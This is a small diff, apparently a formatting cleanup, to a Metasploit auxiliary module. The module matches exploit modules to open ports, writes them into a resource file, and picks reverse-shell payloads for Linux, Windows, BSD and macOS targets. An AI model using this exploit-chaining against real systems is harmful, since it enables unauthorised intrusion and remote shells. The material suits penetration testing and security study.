@@ -5,7 +5,6 @@
 
 require 'msf/base/sessions/scriptable'
 require 'msf/base'
-require 'msf/core'
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
@@ -129,20 +128,20 @@ class MetasploitModule < Msf::Auxiliary
           for mod in msfmodules do
             if  File.open(mod).grep(/\(#{openport}\)/) do
                 open('msfexec.rc', 'a') { |m|
-                mod = mod.gsub(/.*exploits\//, "exploits/")  
+                mod = mod.gsub(/.*exploits\//, "exploits/")
                 m.puts("use #{mod}")
                 print_good("Adding exploit: #{mod}")
                 m.puts("set LPORT #{$handler}")
                 # try to guess the payload shell from the current exploit
-                if mod["linux"] 
+                if mod["linux"]
                   payl = "linux/#{datastore['ARCH']}/shell_reverse_tcp"
-                end 
+                end
                 if mod["windows"]
                   payl = "windows/#{datastore['ARCH']}/shell/reverse_tcp"
-                end   
+                end
                 if mod["freebsd"]
                   payl = "bsd/#{datastore['ARCH']}/shell/reverse_tcp"
-                end                                                                
+                end
                 if mod["osx"]
                   payl = "osx/#{datastore['ARCH']}/shell_reverse_tcp"
                 end
